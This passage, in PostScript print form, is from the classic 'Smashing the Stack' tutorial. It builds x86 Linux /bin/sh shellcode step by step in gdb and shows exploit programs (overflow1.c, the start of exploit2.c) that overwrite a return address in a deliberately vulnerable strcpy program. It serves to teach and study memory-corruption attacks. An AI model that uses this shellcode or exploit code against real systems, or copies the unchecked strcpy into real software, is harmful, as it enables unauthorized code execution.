(------------------------------------------------------------------------------) s
5 426 M
(   To find out what does it looks like in assembly we compile it, and start) s
5 418 M
(up gdb.  Remember to use the -static flag. Otherwise the actual code the) s
5 410 M
(for the execve system call will not be included.  Instead there will be a) s
5 402 M
(reference to dynamic C library that would normally would be linked in at) s
5 394 M
(load time.) s
5 378 M
(------------------------------------------------------------------------------) s
5 370 M
([aleph1]$ gcc -o shellcode -ggdb -static shellcode.c) s
5 362 M
([aleph1]$ gdb shellcode) s
5 354 M
(GDB is free software and you are welcome to distribute copies of it) s
5 346 M
( under certain conditions; type "show copying" to see the conditions.) s
5 338 M
(There is absolutely no warranty for GDB; type "show warranty" for details.) s
5 330 M
(GDB 4.15 \(i586-unknown-linux\), Copyright 1995 Free Software Foundation, Inc...) s
5 322 M
(\(gdb\) disassemble main) s
5 314 M
(Dump of assembler code for function main:) s
5 306 M
(0x8000130 <main>:       pushl  %ebp) s
5 298 M
(0x8000131 <main+1>:     movl   %esp,%ebp) s
5 290 M
(0x8000133 <main+3>:     subl   $0x8,%esp) s
5 282 M
(0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8\(%ebp\)) s
5 274 M
(0x800013d <main+13>:    movl   $0x0,0xfffffffc\(%ebp\)) s
5 266 M
(0x8000144 <main+20>:    pushl  $0x0) s
5 258 M
(0x8000146 <main+22>:    leal   0xfffffff8\(%ebp\),%eax) s
5 250 M
(0x8000149 <main+25>:    pushl  %eax) s
5 242 M
(0x800014a <main+26>:    movl   0xfffffff8\(%ebp\),%eax) s
5 234 M
(0x800014d <main+29>:    pushl  %eax) s
5 226 M
(0x800014e <main+30>:    call   0x80002bc <__execve>) s
5 218 M
(0x8000153 <main+35>:    addl   $0xc,%esp) s
5 210 M
(0x8000156 <main+38>:    movl   %ebp,%esp) s
5 202 M
(0x8000158 <main+40>:    popl   %ebp) s
5 194 M
(0x8000159 <main+41>:    ret) s
5 186 M
(End of assembler dump.) s
5 178 M
(\(gdb\) disassemble __execve) s
5 170 M
(Dump of assembler code for function __execve:) s
5 162 M
(0x80002bc <__execve>:   pushl  %ebp) s
5 154 M
(0x80002bd <__execve+1>: movl   %esp,%ebp) s
5 146 M
(0x80002bf <__execve+3>: pushl  %ebx) s
5 138 M
(0x80002c0 <__execve+4>: movl   $0xb,%eax) s
5 130 M
(0x80002c5 <__execve+9>: movl   0x8\(%ebp\),%ebx) s
5 122 M
(0x80002c8 <__execve+12>:        movl   0xc\(%ebp\),%ecx) s
5 114 M
(0x80002cb <__execve+15>:        movl   0x10\(%ebp\),%edx) s
5 106 M
(0x80002ce <__execve+18>:        int    $0x80) s
5 98 M
(0x80002d0 <__execve+20>:        movl   %eax,%edx) s
5 90 M
(0x80002d2 <__execve+22>:        testl  %edx,%edx) s
5 82 M
(0x80002d4 <__execve+24>:        jnl    0x80002e6 <__execve+42>) s
5 74 M
(0x80002d6 <__execve+26>:        negl   %edx) s
5 66 M
(0x80002d8 <__execve+28>:        pushl  %edx) s
5 58 M
(0x80002d9 <__execve+29>:        call   0x8001a34 <__normal_errno_location>) s
5 50 M
(0x80002de <__execve+34>:        popl   %edx) s
5 42 M
(0x80002df <__execve+35>:        movl   %edx,\(%eax\)) s
5 34 M
(0x80002e1 <__execve+37>:        movl   $0xffffffff,%eax) s
5 26 M
(0x80002e6 <__execve+42>:        popl   %ebx) s
5 18 M
(0x80002e7 <__execve+43>:        movl   %ebp,%esp) s
5 10 M
(0x80002e9 <__execve+45>:        popl   %ebp) s
5 2 M
(0x80002ea <__execve+46>:        ret) s
402 522 M
(0x80002eb <__execve+47>:        nop) s
402 514 M
(End of assembler dump.) s
402 506 M
(------------------------------------------------------------------------------) s
402 490 M
(Lets try to understand what is going on here. We'll start by studying main:) s
402 474 M
(------------------------------------------------------------------------------) s
402 466 M
(0x8000130 <main>:       pushl  %ebp) s
402 458 M
(0x8000131 <main+1>:     movl   %esp,%ebp) s
402 450 M
(0x8000133 <main+3>:     subl   $0x8,%esp) s
402 434 M
(        This is the procedure prelude.  It first saves the old frame pointer,) s
402 426 M
(        makes the current stack pointer the new frame pointer, and leaves ) s
402 418 M
(        space for the local variables. In this case its:) s
402 402 M
(        char *name[2];) s
402 386 M
(        or 2 pointers to a char. Pointers are a word long, so it leaves) s
402 378 M
(        space for two words \(8 bytes\).) s
402 362 M
(0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8\(%ebp\)) s
402 346 M
(        We copy the value 0x80027b8 \(the address of the string "/bin/sh"\)) s
402 338 M
(        into the first pointer of name[]. This is equivalent to:) s
402 322 M
(        name[0] = "/bin/sh";) s
402 306 M
(0x800013d <main+13>:    movl   $0x0,0xfffffffc\(%ebp\)) s
402 290 M
(        We copy the value 0x0 \(NULL\) into the seconds pointer of name[].) s
402 282 M
(        This is equivalent to:) s
402 266 M
(        name[1] = NULL;) s
402 250 M
(        The actual call to execve\(\) starts here.) s
402 234 M
(0x8000144 <main+20>:    pushl  $0x0) s
402 218 M
(        We push the arguments to execve\(\) in reverse order onto the stack.) s
402 210 M
(        We start with NULL.) s
402 194 M
(0x8000146 <main+22>:    leal   0xfffffff8\(%ebp\),%eax) s
402 178 M
(        We load the address of name[] into the EAX register.) s
402 162 M
(0x8000149 <main+25>:    pushl  %eax) s
402 146 M
(        We push the address of name[] onto the stack.) s
402 130 M
(0x800014a <main+26>:    movl   0xfffffff8\(%ebp\),%eax) s
402 114 M
(        We load the address of the string "/bin/sh" into the EAX register.) s
402 98 M
(0x800014d <main+29>:    pushl  %eax) s
402 82 M
(        We push the address of the string "/bin/sh" onto the stack.) s
402 66 M
(0x800014e <main+30>:    call   0x80002bc <__execve>) s
402 50 M
(        Call the library procedure execve\(\).  The call instruction pushes the) s
402 42 M
(        IP onto the stack.) s
402 34 M
(------------------------------------------------------------------------------) s
402 18 M
(   Now execve\(\).  Keep in mind we are using a Intel based Linux system.  The) s
402 10 M
(syscall details will change from OS to OS, and from CPU to CPU.  Some will ) s
402 2 M
(pass the arguments on the stack, others on the registers.  Some use a software) s
_R
S
%%Page: (5) 5
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 5 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (5) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 522 M
(interrupt to jump to kernel mode, others use a far call.  Linux passes its ) s
5 514 M
(arguments to the system call on the registers, and uses a software interrupt ) s
5 506 M
(to jump into kernel mode.) s
5 490 M
(------------------------------------------------------------------------------) s
5 482 M
(0x80002bc <__execve>:   pushl  %ebp) s
5 474 M
(0x80002bd <__execve+1>: movl   %esp,%ebp) s
5 466 M
(0x80002bf <__execve+3>: pushl  %ebx) s
5 450 M
(        The procedure prelude.) s
5 434 M
(0x80002c0 <__execve+4>: movl   $0xb,%eax) s
5 418 M
(        Copy 0xb \(11 decimal\) onto the stack. This is the index into the) s
5 410 M
(        syscall table.  11 is execve.) s
5 394 M
(0x80002c5 <__execve+9>: movl   0x8\(%ebp\),%ebx) s
5 378 M
(        Copy the address of "/bin/sh" into EBX.) s
5 362 M
(0x80002c8 <__execve+12>:        movl   0xc\(%ebp\),%ecx) s
5 346 M
(        Copy the address of name[] into ECX.) s
5 330 M
(0x80002cb <__execve+15>:        movl   0x10\(%ebp\),%edx) s
5 314 M
(        Copy the address of the null pointer into %edx.) s
5 298 M
(0x80002ce <__execve+18>:        int    $0x80) s
5 282 M
(        Change into kernel mode.) s
5 274 M
(------------------------------------------------------------------------------) s
5 258 M
(So as we can see there is not much to the execve\(\) system call.  All we need) s
5 250 M
(to do is:) s
5 234 M
(        a\) Have the null terminated string "/bin/sh" somewhere in memory.) s
5 226 M
(        b\) Have the address of the string "/bin/sh" somewhere in memory) s
5 218 M
(           followed by a null long word.) s
5 210 M
(        c\) Copy 0xb into the EAX register.) s
5 202 M
(        d\) Copy the address of the address of the string "/bin/sh" into the) s
5 194 M
(           EBX register.) s
5 186 M
(        e\) Copy the address of the string "/bin/sh" into the ECX register.) s
5 178 M
(        f\) Copy the address of the null long word into the EDX register.) s
5 170 M
(        g\) Execute the int $0x80 instruction.) s
5 154 M
(   But what if the execve\(\) call fails for some reason?  The program will) s
5 146 M
(continue fetching instructions from the stack, which may contain random data!) s
5 138 M
(The program will most likely core dump.  We want the program to exit cleanly) s
5 130 M
(if the execve syscall fails.  To accomplish this we must then add a exit) s
5 122 M
(syscall after the execve syscall.  What does the exit syscall looks like?) s
5 106 M
(exit.c) s
5 98 M
(------------------------------------------------------------------------------) s
5 90 M
(#include <stdlib.h>) s
5 74 M
(void main\(\) {) s
5 66 M
(        exit\(0\);) s
5 58 M
(}) s
5 50 M
(------------------------------------------------------------------------------) s
5 34 M
(------------------------------------------------------------------------------) s
5 26 M
([aleph1]$ gcc -o exit -static exit.c) s
5 18 M
([aleph1]$ gdb exit) s
5 10 M
(GDB is free software and you are welcome to distribute copies of it) s
5 2 M
( under certain conditions; type "show copying" to see the conditions.) s
402 522 M
(There is absolutely no warranty for GDB; type "show warranty" for details.) s
402 514 M
(GDB 4.15 \(i586-unknown-linux\), Copyright 1995 Free Software Foundation, Inc...) s
402 506 M
(\(no debugging symbols found\)...) s
402 498 M
(\(gdb\) disassemble _exit) s
402 490 M
(Dump of assembler code for function _exit:) s
402 482 M
(0x800034c <_exit>:      pushl  %ebp) s
402 474 M
(0x800034d <_exit+1>:    movl   %esp,%ebp) s
402 466 M
(0x800034f <_exit+3>:    pushl  %ebx) s
402 458 M
(0x8000350 <_exit+4>:    movl   $0x1,%eax) s
402 450 M
(0x8000355 <_exit+9>:    movl   0x8\(%ebp\),%ebx) s
402 442 M
(0x8000358 <_exit+12>:   int    $0x80) s
402 434 M
(0x800035a <_exit+14>:   movl   0xfffffffc\(%ebp\),%ebx) s
402 426 M
(0x800035d <_exit+17>:   movl   %ebp,%esp) s
402 418 M
(0x800035f <_exit+19>:   popl   %ebp) s
402 410 M
(0x8000360 <_exit+20>:   ret) s
402 402 M
(0x8000361 <_exit+21>:   nop) s
402 394 M
(0x8000362 <_exit+22>:   nop) s
402 386 M
(0x8000363 <_exit+23>:   nop) s
402 378 M
(End of assembler dump.) s
402 370 M
(------------------------------------------------------------------------------) s
402 354 M
(   The exit syscall will place 0x1 in EAX, place the exit code in EBX,) s
402 346 M
(and execute "int 0x80".  That's it.  Most applications return 0 on exit to) s
402 338 M
(indicate no errors.  We will place 0 in EBX.  Our list of steps is now:) s
402 322 M
(        a\) Have the null terminated string "/bin/sh" somewhere in memory.) s
402 314 M
(        b\) Have the address of the string "/bin/sh" somewhere in memory) s
402 306 M
(           followed by a null long word.) s
402 298 M
(        c\) Copy 0xb into the EAX register.) s
402 290 M
(        d\) Copy the address of the address of the string "/bin/sh" into the) s
402 282 M
(           EBX register.) s
402 274 M
(        e\) Copy the address of the string "/bin/sh" into the ECX register.) s
402 266 M
(        f\) Copy the address of the null long word into the EDX register.) s
402 258 M
(        g\) Execute the int $0x80 instruction.) s
402 250 M
(        h\) Copy 0x1 into the EAX register.) s
402 242 M
(        i\) Copy 0x0 into the EBX register.) s
402 234 M
(        j\) Execute the int $0x80 instruction.) s
402 218 M
(   Trying to put this together in assembly language, placing the string) s
402 210 M
(after the code, and remembering we will place the address of the string,) s
402 202 M
(and null word after the array, we have:) s
402 186 M
(------------------------------------------------------------------------------) s
402 178 M
(        movl   string_addr,string_addr_addr) s
402 170 M
(        movb   $0x0,null_byte_addr) s
402 162 M
(        movl   $0x0,null_addr) s
402 154 M
(        movl   $0xb,%eax) s
402 146 M
(        movl   string_addr,%ebx) s
402 138 M
(        leal   string_addr,%ecx) s
402 130 M
(        leal   null_string,%edx) s
402 122 M
(        int    $0x80) s
402 114 M
(        movl   $0x1, %eax) s
402 106 M
(        movl   $0x0, %ebx) s
402 98 M
(        int    $0x80) s
402 90 M
(        /bin/sh string goes here.) s
402 82 M
(------------------------------------------------------------------------------) s
402 66 M
(   The problem is that we don't know where in the memory space of the ) s
402 58 M
(program we are trying to exploit the code \(and the string that follows ) s
402 50 M
(it\) will be placed.  One way around it is to use a JMP, and a CALL ) s
402 42 M
(instruction.  The JMP and CALL instructions can use IP relative addressing, ) s
402 34 M
(which means we can jump to an offset from the current IP without needing ) s
402 26 M
(to know the exact address of where in memory we want to jump to.  If we ) s
402 18 M
(place a CALL instruction right before the "/bin/sh" string, and a JMP ) s
402 10 M
(instruction to it, the strings address will be pushed onto the stack as ) s
402 2 M
(the return address when CALL is executed.  All we need then is to copy the ) s
_R
S
%%Page: (6) 6
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 6 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (6) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 522 M
(return address into a register.  The CALL instruction can simply call the ) s
5 514 M
(start of our code above.  Assuming now that J stands for the JMP instruction,) s
5 506 M
(C for the CALL instruction, and s for the string,  the execution flow would ) s
5 498 M
(now be:) s
5 474 M
(bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of) s
5 466 M
(memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory) s
5 458 M
(           buffer                sfp   ret   a     b     c) s
5 442 M
(<------   [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]) s
5 434 M
(           ^|^             ^|            |) s
5 426 M
(           |||_____________||____________| \(1\)) s
5 418 M
(       \(2\)  ||_____________||) s
5 410 M
(             |______________| \(3\)) s
5 402 M
(top of                                                            bottom of) s
5 394 M
(stack                                                                 stack) s
5 362 M
(   With this modifications, using indexed addressing, and writing down how) s
5 354 M
(many bytes each instruction takes our code looks like:) s
5 338 M
(------------------------------------------------------------------------------) s
5 330 M
(        jmp    offset-to-call           # 2 bytes) s
5 322 M
(        popl   %esi                     # 1 byte) s
5 314 M
(        movl   %esi,array-offset\(%esi\)  # 3 bytes) s
5 306 M
(        movb   $0x0,nullbyteoffset\(%esi\)# 4 bytes) s
5 298 M
(        movl   $0x0,null-offset\(%esi\)   # 7 bytes) s
5 290 M
(        movl   $0xb,%eax                # 5 bytes) s
5 282 M
(        movl   %esi,%ebx                # 2 bytes) s
5 274 M
(        leal   array-offset,\(%esi\),%ecx # 3 bytes) s
5 266 M
(        leal   null-offset\(%esi\),%edx   # 3 bytes) s
5 258 M
(        int    $0x80                    # 2 bytes) s
5 250 M
(        movl   $0x1, %eax               # 5 bytes) s
5 242 M
(        movl   $0x0, %ebx               # 5 bytes) s
5 234 M
(        int    $0x80                    # 2 bytes) s
5 226 M
(        call   offset-to-popl           # 5 bytes) s
5 218 M
(        /bin/sh string goes here.) s
5 210 M
(------------------------------------------------------------------------------) s
5 194 M
(   Calculating the offsets from jmp to call, from call to popl, from) s
5 186 M
(the string address to the array, and from the string address to the null) s
5 178 M
(long word, we now have:) s
5 162 M
(------------------------------------------------------------------------------) s
5 154 M
(        jmp    0x26                     # 2 bytes) s
5 146 M
(        popl   %esi                     # 1 byte) s
5 138 M
(        movl   %esi,0x8\(%esi\)           # 3 bytes) s
5 130 M
(        movb   $0x0,0x7\(%esi\)           # 4 bytes) s
5 122 M
(        movl   $0x0,0xc\(%esi\)           # 7 bytes) s
5 114 M
(        movl   $0xb,%eax                # 5 bytes) s
5 106 M
(        movl   %esi,%ebx                # 2 bytes) s
5 98 M
(        leal   0x8\(%esi\),%ecx           # 3 bytes) s
5 90 M
(        leal   0xc\(%esi\),%edx           # 3 bytes) s
5 82 M
(        int    $0x80                    # 2 bytes) s
5 74 M
(        movl   $0x1, %eax               # 5 bytes) s
5 66 M
(        movl   $0x0, %ebx               # 5 bytes) s
5 58 M
(        int    $0x80                    # 2 bytes) s
5 50 M
(        call   -0x2b                    # 5 bytes) s
5 42 M
(        .string \\"/bin/sh\\"             # 8 bytes) s
5 34 M
(------------------------------------------------------------------------------) s
5 18 M
(   Looks good. To make sure it works correctly we must compile it and run it.) s
5 10 M
(But there is a problem.  Our code modifies itself, but most operating system) s
5 2 M
(mark code pages read-only.  To get around this restriction we must place the) s
402 522 M
(code we wish to execute in the stack or data segment, and transfer control) s
402 514 M
(to it.  To do so we will place our code in a global array in the data) s
402 506 M
(segment.  We need first a hex representation of the binary code. Lets) s
402 498 M
(compile it first, and then use gdb to obtain it.) s
402 482 M
(shellcodeasm.c) s
402 474 M
(------------------------------------------------------------------------------) s
402 466 M
(void main\(\) {) s
402 458 M
(__asm__\(") s
402 450 M
(        jmp    0x2a                     # 3 bytes) s
402 442 M
(        popl   %esi                     # 1 byte) s
402 434 M
(        movl   %esi,0x8\(%esi\)           # 3 bytes) s
402 426 M
(        movb   $0x0,0x7\(%esi\)           # 4 bytes) s
402 418 M
(        movl   $0x0,0xc\(%esi\)           # 7 bytes) s
402 410 M
(        movl   $0xb,%eax                # 5 bytes) s
402 402 M
(        movl   %esi,%ebx                # 2 bytes) s
402 394 M
(        leal   0x8\(%esi\),%ecx           # 3 bytes) s
402 386 M
(        leal   0xc\(%esi\),%edx           # 3 bytes) s
402 378 M
(        int    $0x80                    # 2 bytes) s
402 370 M
(        movl   $0x1, %eax               # 5 bytes) s
402 362 M
(        movl   $0x0, %ebx               # 5 bytes) s
402 354 M
(        int    $0x80                    # 2 bytes) s
402 346 M
(        call   -0x2f                    # 5 bytes) s
402 338 M
(        .string \\"/bin/sh\\"             # 8 bytes) s
402 330 M
("\);) s
402 322 M
(}) s
402 314 M
(------------------------------------------------------------------------------) s
402 298 M
(------------------------------------------------------------------------------) s
402 290 M
([aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c) s
402 282 M
([aleph1]$ gdb shellcodeasm) s
402 274 M
(GDB is free software and you are welcome to distribute copies of it) s
402 266 M
( under certain conditions; type "show copying" to see the conditions.) s
402 258 M
(There is absolutely no warranty for GDB; type "show warranty" for details.) s
402 250 M
(GDB 4.15 \(i586-unknown-linux\), Copyright 1995 Free Software Foundation, Inc...) s
402 242 M
(\(gdb\) disassemble main) s
402 234 M
(Dump of assembler code for function main:) s
402 226 M
(0x8000130 <main>:       pushl  %ebp) s
402 218 M
(0x8000131 <main+1>:     movl   %esp,%ebp) s
402 210 M
(0x8000133 <main+3>:     jmp    0x800015f <main+47>) s
402 202 M
(0x8000135 <main+5>:     popl   %esi) s
402 194 M
(0x8000136 <main+6>:     movl   %esi,0x8\(%esi\)) s
402 186 M
(0x8000139 <main+9>:     movb   $0x0,0x7\(%esi\)) s
402 178 M
(0x800013d <main+13>:    movl   $0x0,0xc\(%esi\)) s
402 170 M
(0x8000144 <main+20>:    movl   $0xb,%eax) s
402 162 M
(0x8000149 <main+25>:    movl   %esi,%ebx) s
402 154 M
(0x800014b <main+27>:    leal   0x8\(%esi\),%ecx) s
402 146 M
(0x800014e <main+30>:    leal   0xc\(%esi\),%edx) s
402 138 M
(0x8000151 <main+33>:    int    $0x80) s
402 130 M
(0x8000153 <main+35>:    movl   $0x1,%eax) s
402 122 M
(0x8000158 <main+40>:    movl   $0x0,%ebx) s
402 114 M
(0x800015d <main+45>:    int    $0x80) s
402 106 M
(0x800015f <main+47>:    call   0x8000135 <main+5>) s
402 98 M
(0x8000164 <main+52>:    das) s
402 90 M
(0x8000165 <main+53>:    boundl 0x6e\(%ecx\),%ebp) s
402 82 M
(0x8000168 <main+56>:    das) s
402 74 M
(0x8000169 <main+57>:    jae    0x80001d3 <__new_exitfn+55>) s
402 66 M
(0x800016b <main+59>:    addb   %cl,0x55c35dec\(%ecx\)) s
402 58 M
(End of assembler dump.) s
402 50 M
(\(gdb\) x/bx main+3) s
402 42 M
(0x8000133 <main+3>:     0xeb) s
402 34 M
(\(gdb\)) s
402 26 M
(0x8000134 <main+4>:     0x2a) s
402 18 M
(\(gdb\)) s
402 10 M
(.) s
402 2 M
(.) s
_R
S
%%Page: (7) 7
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 7 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (7) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 522 M
(.) s
5 514 M
(------------------------------------------------------------------------------) s
5 498 M
(testsc.c) s
5 490 M
(------------------------------------------------------------------------------) s
5 482 M
(char shellcode[] =) s
5 474 M
(        "\\xeb\\x2a\\x5e\\x89\\x76\\x08\\xc6\\x46\\x07\\x00\\xc7\\x46\\x0c\\x00\\x00\\x00") s
5 466 M
(        "\\x00\\xb8\\x0b\\x00\\x00\\x00\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80") s
5 458 M
(        "\\xb8\\x01\\x00\\x00\\x00\\xbb\\x00\\x00\\x00\\x00\\xcd\\x80\\xe8\\xd1\\xff\\xff") s
5 450 M
(        "\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x89\\xec\\x5d\\xc3";) s
5 434 M
(void main\(\) {) s
5 426 M
(   int *ret;) s
5 410 M
(   ret = \(int *\)&ret + 2;) s
5 402 M
(   \(*ret\) = \(int\)shellcode;) s
5 386 M
(}) s
5 378 M
(------------------------------------------------------------------------------) s
5 370 M
(------------------------------------------------------------------------------) s
5 362 M
([aleph1]$ gcc -o testsc testsc.c) s
5 354 M
([aleph1]$ ./testsc) s
5 346 M
($ exit) s
5 338 M
([aleph1]$) s
5 330 M
(------------------------------------------------------------------------------) s
5 314 M
(   It works! But there is an obstacle.  In most cases we'll be trying to) s
5 306 M
(overflow a character buffer.  As such any null bytes in our shellcode will be) s
5 298 M
(considered the end of the string, and the copy will be terminated.  There must) s
5 290 M
(be no null bytes in the shellcode for the exploit to work.  Let's try to) s
5 282 M
(eliminate the bytes \(and at the same time make it smaller\).) s
5 266 M
(           Problem instruction:                 Substitute with:) s
5 258 M
(           --------------------------------------------------------) s
5 250 M
(           movb   $0x0,0x7\(%esi\)                xorl   %eax,%eax) s
5 242 M
(           molv   $0x0,0xc\(%esi\)                movb   %eax,0x7\(%esi\)) s
5 234 M
(                                                movl   %eax,0xc\(%esi\)) s
5 226 M
(           --------------------------------------------------------) s
5 218 M
(           movl   $0xb,%eax                     movb   $0xb,%al) s
5 210 M
(           --------------------------------------------------------) s
5 202 M
(           movl   $0x1, %eax                    xorl   %ebx,%ebx) s
5 194 M
(           movl   $0x0, %ebx                    movl   %ebx,%eax) s
5 186 M
(                                                inc    %eax) s
5 178 M
(           --------------------------------------------------------) s
5 162 M
(   Our improved code:) s
5 146 M
(shellcodeasm2.c) s
5 138 M
(------------------------------------------------------------------------------) s
5 130 M
(void main\(\) {) s
5 122 M
(__asm__\(") s
5 114 M
(        jmp    0x1f                     # 2 bytes) s
5 106 M
(        popl   %esi                     # 1 byte) s
5 98 M
(        movl   %esi,0x8\(%esi\)           # 3 bytes) s
5 90 M
(        xorl   %eax,%eax                # 2 bytes) s
5 82 M
(        movb   %eax,0x7\(%esi\)           # 3 bytes) s
5 74 M
(        movl   %eax,0xc\(%esi\)           # 3 bytes) s
5 66 M
(        movb   $0xb,%al                 # 2 bytes) s
5 58 M
(        movl   %esi,%ebx                # 2 bytes) s
5 50 M
(        leal   0x8\(%esi\),%ecx           # 3 bytes) s
5 42 M
(        leal   0xc\(%esi\),%edx           # 3 bytes) s
5 34 M
(        int    $0x80                    # 2 bytes) s
5 26 M
(        xorl   %ebx,%ebx                # 2 bytes) s
5 18 M
(        movl   %ebx,%eax                # 2 bytes) s
5 10 M
(        inc    %eax                     # 1 bytes) s
5 2 M
(        int    $0x80                    # 2 bytes) s
402 522 M
(        call   -0x24                    # 5 bytes) s
402 514 M
(        .string \\"/bin/sh\\"             # 8 bytes) s
402 506 M
(                                        # 46 bytes total) s
402 498 M
("\);) s
402 490 M
(}) s
402 482 M
(------------------------------------------------------------------------------) s
402 466 M
(   And our new test program:) s
402 450 M
(testsc2.c) s
402 442 M
(------------------------------------------------------------------------------) s
402 434 M
(char shellcode[] =) s
402 426 M
(        "\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b") s
402 418 M
(        "\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd") s
402 410 M
(        "\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";) s
402 394 M
(void main\(\) {) s
402 386 M
(   int *ret;) s
402 370 M
(   ret = \(int *\)&ret + 2;) s
402 362 M
(   \(*ret\) = \(int\)shellcode;) s
402 346 M
(}) s
402 338 M
(------------------------------------------------------------------------------) s
402 330 M
(------------------------------------------------------------------------------) s
402 322 M
([aleph1]$ gcc -o testsc2 testsc2.c) s
402 314 M
([aleph1]$ ./testsc2) s
402 306 M
($ exit) s
402 298 M
([aleph1]$) s
402 290 M
(------------------------------------------------------------------------------) s
402 266 M
(                              Writing an Exploit) s
402 258 M
(                              ~~~~~~~~~~~~~~~~~~) s
402 250 M
(                          \(or how to mung the stack\)) s
402 242 M
(                          ~~~~~~~~~~~~~~~~~~~~~~~~~~) s
402 218 M
(   Lets try to pull all our pieces together.  We have the shellcode.  We know) s
402 210 M
(it must be part of the string which we'll use to overflow the buffer.  We ) s
402 202 M
(know we must point the return address back into the buffer.  This example will) s
402 194 M
(demonstrate these points:) s
402 178 M
(overflow1.c) s
402 170 M
(------------------------------------------------------------------------------) s
402 162 M
(char shellcode[] =) s
402 154 M
(        "\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b") s
402 146 M
(        "\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd") s
402 138 M
(        "\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";) s
402 122 M
(char large_string[128];) s
402 106 M
(void main\(\) {) s
402 98 M
(  char buffer[96];) s
402 90 M
(  int i;) s
402 82 M
(  long *long_ptr = \(long *\) large_string;) s
402 66 M
(  for \(i = 0; i < 32; i++\)) s
402 58 M
(    *\(long_ptr + i\) = \(int\) buffer;) s
402 42 M
(  for \(i = 0; i < strlen\(shellcode\); i++\)) s
402 34 M
(    large_string[i] = shellcode[i];) s
402 18 M
(  strcpy\(buffer,large_string\);) s
402 10 M
(}) s
402 2 M
(------------------------------------------------------------------------------) s
_R
S
%%Page: (8) 8
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 8 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (8) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 514 M
(------------------------------------------------------------------------------) s
5 506 M
([aleph1]$ gcc -o exploit1 exploit1.c) s
5 498 M
([aleph1]$ ./exploit1) s
5 490 M
($ exit) s
5 482 M
(exit) s
5 474 M
([aleph1]$) s
5 466 M
(------------------------------------------------------------------------------) s
5 450 M
(   What we have done above is filled the array large_string[] with the) s
5 442 M
(address of buffer[], which is where our code will be.  Then we copy our) s
5 434 M
(shellcode into the beginning of the large_string string.  strcpy\(\) will then) s
5 426 M
(copy large_string onto buffer without doing any bounds checking, and will) s
5 418 M
(overflow the return address, overwriting it with the address where our code) s
5 410 M
(is now located.  Once we reach the end of main and it tried to return it) s
5 402 M
(jumps to our code, and execs a shell.) s
5 386 M
(   The problem we are faced when trying to overflow the buffer of another) s
5 378 M
(program is trying to figure out at what address the buffer \(and thus our) s
5 370 M
(code\) will be.  The answer is that for every program the stack will) s
5 362 M
(start at the same address.  Most programs do not push more than a few hundred) s
5 354 M
(or a few thousand bytes into the stack at any one time.  Therefore by knowing) s
5 346 M
(where the stack starts we can try to guess where the buffer we are trying to) s
5 338 M
(overflow will be.  Here is a little program that will print its stack) s
5 330 M
(pointer:) s
5 314 M
(sp.c) s
5 306 M
(------------------------------------------------------------------------------) s
5 298 M
(unsigned long get_sp\(void\) {) s
5 290 M
(   __asm__\("movl %esp,%eax"\);) s
5 282 M
(}) s
5 274 M
(void main\(\) {) s
5 266 M
(  printf\("0x%x\\n", get_sp\(\)\);) s
5 258 M
(}) s
5 250 M
(------------------------------------------------------------------------------) s
5 234 M
(------------------------------------------------------------------------------) s
5 226 M
([aleph1]$ ./sp) s
5 218 M
(0x8000470) s
5 210 M
([aleph1]$) s
5 202 M
(------------------------------------------------------------------------------) s
5 186 M
(   Lets assume this is the program we are trying to overflow is:) s
5 170 M
(vulnerable.c) s
5 162 M
(------------------------------------------------------------------------------) s
5 154 M
(void main\(int argc, char *argv[]\) {) s
5 146 M
(  char buffer[512];) s
5 130 M
(  if \(argc > 1\)) s
5 122 M
(    strcpy\(buffer,argv[1]\);) s
5 114 M
(}) s
5 106 M
(------------------------------------------------------------------------------) s
5 90 M
(   We can create a program that takes as a parameter a buffer size, and an) s
5 82 M
(offset from its own stack pointer \(where we believe the buffer we want to) s
5 74 M
(overflow may live\).  We'll put the overflow string in an environment variable) s
5 66 M
(so it is easy to manipulate:) s
5 50 M
(exploit2.c) s
5 42 M
(------------------------------------------------------------------------------) s
5 34 M
(#include <stdlib.h>) s
5 18 M
(#define DEFAULT_OFFSET                    0) s
5 10 M
(#define DEFAULT_BUFFER_SIZE             512) s
402 522 M
(char shellcode[] =) s
402 514 M
(  "\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b") s
